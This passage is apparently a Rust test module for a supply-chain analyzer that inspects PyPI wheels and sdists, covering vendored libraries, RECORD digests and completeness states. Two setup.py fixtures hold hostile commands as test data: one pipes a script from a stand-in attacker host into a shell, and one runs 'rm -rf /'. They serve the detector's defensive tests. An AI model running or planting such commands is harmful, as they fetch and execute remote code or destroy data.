        assert!(a.components.iter().all(|c| c.version.is_none()));

        let w_c = a.components.iter().find(|c| c.name == "libwebp").unwrap();
        assert_eq!(
            w_c.detection_method, "wheel:auditwheel:Pillow.libs/libwebp-850e2bec.so.7.1.3",
            "detection_method points at the MANGLED archive member, which is what \
             a reviewer greps an unzip listing for"
        );
        assert_eq!(
            w_c.soname, "libwebp.so.7.1.3",
            "the de-mangled name has its own column and is not duplicated into \
             detection_method"
        );
        assert_eq!(w_c.abi_version.as_deref(), Some("7.1.3"));
        let expected_digest = hex::encode(<sha2::Sha256 as sha2::Digest>::digest(webp));
        assert_eq!(
            w_c.sha256.as_deref(),
            Some(expected_digest.as_str()),
            "digest comes from RECORD, without inflating the .so"
        );
        assert_eq!(w_c.confidence, SourceConfidence::Unresolved);
        assert!(w_c.purl.is_none(), "no version, so no purl");
    }

    #[test]
    fn pypi_wheel_reports_delocate_vendored_libraries() {
        let tiff: &[u8] = b"\xcf\xfa\xed\xfe fake tiff";
        let record = record_line("PIL/.dylibs/libtiff-91af027d.5.dylib", tiff);
        let w = wheel(&[
            ("PIL/_imaging.cpython-311-darwin.so", b"" as &[u8]),
            ("PIL/.dylibs/libtiff-91af027d.5.dylib", tiff),
            ("Pillow-10.0.0.dist-info/RECORD", record.as_bytes()),
        ]);

        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(status(&a.completeness), "complete");
        assert_eq!(
            a.components.len(),
            1,
            "the extension module is not vendored"
        );
        let c = &a.components[0];
        assert_eq!(c.name, "libtiff");
        assert_eq!(c.abi_version.as_deref(), Some("5"));
        assert_eq!(
            c.detection_method,
            "wheel:delocate:PIL/.dylibs/libtiff-91af027d.5.dylib"
        );
        assert_eq!(c.soname, "libtiff.5.dylib");
        assert!(c.sha256.is_some());
    }

    #[test]
    fn pypi_wheel_with_no_vendored_libs_is_complete_and_empty() {
        // The defect this whole change exists to remove: an empty component
        // list must be reachable ONLY through a successful read, and must be
        // distinguishable from one we never looked at.
        let w = wheel(&[
            ("pkg/__init__.py", b"" as &[u8]),
            ("pkg-1.0.dist-info/METADATA", b"Name: pkg\n"),
            ("pkg-1.0.dist-info/RECORD", b"pkg/__init__.py,,0\n"),
        ]);
        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(status(&a.completeness), "complete");
        assert!(a.components.is_empty());
    }

    #[test]
    fn pypi_wheel_without_record_is_complete_with_null_digests() {
        // PEP 427 requires RECORD, so a wheel without one is malformed — but
        // we walked the whole archive to establish that, and the component
        // list is whole. `Completeness` answers "how much did we read", and
        // the missing evidence is already machine-readable as `sha256: None`
        // on the rows. Spending `Partial` here would blur the one thing
        // `Partial` means.
        let so: &[u8] = b"\x7fELF";
        let w = wheel(&[("numpy.libs/libopenblas-15028c96.so.3", so)]);
        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(a.components.len(), 1);
        assert!(a.components[0].sha256.is_none());
        assert_eq!(status(&a.completeness), "complete");
    }

    #[test]
    fn pypi_wheel_with_an_unread_record_is_partial() {
        // The one case that IS a partial read: the bytes are in the archive
        // and the per-entry cap refused them. Distinct from RECORD being
        // absent, which is a complete read of a malformed wheel.
        let so: &[u8] = b"\x7fELF";
        let record = record_line("numpy.libs/libopenblas-15028c96.so.3", so);
        let w = wheel(&[
            ("numpy.libs/libopenblas-15028c96.so.3", so),
            ("numpy-1.0.dist-info/RECORD", record.as_bytes()),
        ]);

        // A cap far below the RECORD's real size, via the `_limited` seam.
        let a = analyze_wheel_limited(Cursor::new(w), MAX_INGEST_ARCHIVE_ENTRIES, 8);
        assert_eq!(a.components.len(), 1);
        assert!(a.components[0].sha256.is_none());
        match &a.completeness {
            Completeness::Partial { reason, .. } => {
                assert!(
                    reason.contains("RECORD is present but was not read"),
                    "{reason}"
                );
            }
            other => panic!("expected partial, got {other:?}"),
        }
    }

    #[test]
    fn pypi_wheel_with_an_unparseable_record_is_complete() {
        // Read in full, not usable. That is malformed, not unread — so the
        // package-level claim stands and the rows carry `sha256: None`.
        let so: &[u8] = b"\x7fELF";
        let w = wheel(&[
            ("numpy.libs/libopenblas-15028c96.so.3", so),
            ("numpy-1.0.dist-info/RECORD", &[0xff, 0xfe, 0xff][..]),
        ]);
        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(a.components.len(), 1);
        assert!(a.components[0].sha256.is_none());
        assert_eq!(status(&a.completeness), "complete");
    }

    #[test]
    fn pypi_corrupt_wheel_is_not_read() {
        let a = analyze_wheel(Cursor::new(b"not a zip at all".to_vec()));
        assert_eq!(status(&a.completeness), "not_read");
        assert!(a.components.is_empty());
        match a.completeness {
            Completeness::NotRead { reason } => assert!(reason.contains("ZIP"), "{reason}"),
            other => panic!("expected not_read, got {other:?}"),
        }
    }

    #[test]
    fn pypi_wheel_duplicate_libraries_collapse_to_one_row() {
        let so: &[u8] = b"\x7fELF";
        let w = wheel(&[
            ("a.libs/libz-aaaaaaa1.so.1", so),
            ("b.libs/libz-bbbbbbb2.so.1", so),
        ]);
        let a = analyze_wheel(Cursor::new(w));
        assert_eq!(
            a.components.len(),
            1,
            "same name and version is one finding"
        );
    }

    // -- sdists ------------------------------------------------------------

    #[test]
    fn pypi_sdist_setup_py_is_analyzed_for_hostile_code() {
        let setup = b"from setuptools import setup\n\
                      import os\n\
                      os.system('curl http://evil.example/x.sh | sh')\n\
                      setup(name='pkg')\n";
        let t = tar_gz(&[
            ("pkg-1.0/PKG-INFO", b"Name: pkg\n" as &[u8]),
            ("pkg-1.0/setup.py", setup),
        ]);

        let a = analyze_sdist_tar_gz(&t[..]);
        assert_eq!(status(&a.completeness), "complete");
        assert_eq!(a.inline_scripts.len(), 1);
        let s = &a.inline_scripts[0];
        assert_eq!(s.kind, ScriptKind::PythonSetupPy);
        assert_eq!(s.path, "setup.py");

        let findings = crate::services::conda_scripts::analyze_script(s);
        assert!(
            !findings.is_empty(),
            "a piped remote shell in setup.py must produce a finding"
        );
    }

    #[test]
    fn pypi_sdist_without_setup_py_is_complete_and_empty() {
        let t = tar_gz(&[
            ("pkg-1.0/PKG-INFO", b"Name: pkg\n" as &[u8]),
            ("pkg-1.0/pyproject.toml", b"[build-system]\n"),
        ]);
        let a = analyze_sdist_tar_gz(&t[..]);
        assert_eq!(status(&a.completeness), "complete");
        assert!(a.inline_scripts.is_empty());
    }

    #[test]
    fn pypi_sdist_ignores_a_nested_test_fixture_setup_py() {
        let t = tar_gz(&[
            ("pkg-1.0/PKG-INFO", b"Name: pkg\n" as &[u8]),
            (
                "pkg-1.0/tests/fixtures/setup.py",
                b"os.system('rm -rf /')\n",
            ),
        ]);
        let a = analyze_sdist_tar_gz(&t[..]);
        assert_eq!(status(&a.completeness), "complete");
        assert!(
            a.inline_scripts.is_empty(),
            "only <root>/setup.py is executed by pip"
        );
    }

    #[test]
    fn pypi_corrupt_sdist_is_not_read() {
        let a = analyze_sdist_tar_gz(&b"\x1f\x8b truncated garbage"[..]);
        assert_eq!(status(&a.completeness), "not_read");
        assert!(a.inline_scripts.is_empty());
    }

    #[test]
    fn pypi_zip_sdist_setup_py_is_analyzed() {
        let z = wheel(&[
            ("pkg-1.0/PKG-INFO", b"Name: pkg\n" as &[u8]),
            ("pkg-1.0/setup.py", b"setup(name='pkg')\n"),
        ]);
        let a = analyze_sdist_zip(Cursor::new(z));
        assert_eq!(status(&a.completeness), "complete");
        assert_eq!(a.inline_scripts.len(), 1);
    }

    #[test]
    fn pypi_non_utf8_setup_py_is_recorded_as_extracted_but_not_analyzed() {
        let raw: &[u8] = &[0xff, 0xfe, 0x00, 0x01];
        let t = tar_gz(&[("pkg-1.0/setup.py", raw)]);
        let a = analyze_sdist_tar_gz(&t[..]);

        // It must never reach the rule engine: shell/Python rules over a
        // mangled decode would both miss real behaviour and invent matches.
        assert!(a.inline_scripts.is_empty());
        assert_eq!(a.unanalyzed_scripts.len(), 1);

        let u = &a.unanalyzed_scripts[0];
        assert_eq!(u.script.kind, ScriptKind::PythonSetupPy);
        assert_eq!(u.script.path, "setup.py");
        assert_eq!(
            u.script.sha256,
            hex::encode(<sha2::Sha256 as sha2::Digest>::digest(raw)),
            "the digest must be of the ORIGINAL bytes, so `sha256sum setup.py` \
             matches the stored row — not of the lossy decode"
        );
        assert_eq!(
            u.original_size_bytes,
            raw.len() as i64,
            "the real byte count, not the lossy body's — U+FFFD is 3 bytes, so \
             deriving it from the decode would store 12 for this 4-byte file"
        );
        assert!(u.reason.contains("lossy"), "{}", u.reason);

        // The archive was read end to end; what we could not do is ANALYSE the
        // file. That second fact rides on the NULL findings, not on
        // completeness, now that a row can carry it.
        assert_eq!(status(&a.completeness), "complete");
    }

    // -- dispatch ----------------------------------------------------------

    #[test]
    fn pypi_unknown_distribution_type_is_unsupported_not_complete() {
        let a = analyze_distribution("pkg-1.0-py3.7.egg", Cursor::new(Vec::new()));
        assert_eq!(status(&a.completeness), "unsupported");
    }

    #[test]
    fn pypi_dispatch_picks_the_wheel_reader() {
        let so: &[u8] = b"\x7fELF";
        let w = wheel(&[("p.libs/libz-abcdef12.so.1", so)]);
        let a = analyze_distribution("p-1.0-cp311-cp311-manylinux_x86_64.whl", Cursor::new(w));
        assert_eq!(a.components.len(), 1);
    }

    // -- handoff to record_analysis ----------------------------------------

    #[test]
    fn pypi_component_handoff_invents_nothing_it_did_not_find() {
        let so: &[u8] = b"\x7fELF";
        let w = wheel(&[("p.libs/libwebp-850e2bec.so.7.1.3", so)]);
        let a = analyze_wheel(Cursor::new(w));
        let e = a.components[0].to_extracted();

        assert_eq!(e.name, "libwebp");
        assert_eq!(e.soname.as_deref(), Some("libwebp.so.7.1.3"));
        assert_eq!(e.abi_version.as_deref(), Some("7.1.3"));
        assert_eq!(
            e.version, None,
            "7.1.3 is the ABI tail; libwebp.so.7 ships in libwebp 1.2.4"
        );
        assert_eq!(e.purl, None, "no version, so no purl");

        // A vendored .so has no upstream source locator and no patch history.
        // Anything synthesised here would read as fact downstream.
        assert_eq!(e.source_url, None);
        assert_eq!(e.git_url, None);
        assert_eq!(e.git_rev, None);
        assert!(e.applied_patches.is_empty());
    }

    // -- RECORD ------------------------------------------------------------

    #[test]
    fn pypi_record_parsing_skips_fields_it_cannot_trust() {
        let r = "a.so,sha256=AAAA,10\n\
                 b.so,,0\n\
                 c.so,md5=abc,10\n\
                 d.so,sha256=47DEQpj8HBSa-_TImW-5JCeuQeRkm5NMpJWZG3hSuFU,0\n";
        let m = parse_record_hashes(r);
        assert_eq!(m.len(), 1, "only the well-formed sha256 line is kept");
        assert_eq!(
            m.get("d.so").map(String::as_str),
            Some("e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855")
        );
    }
}
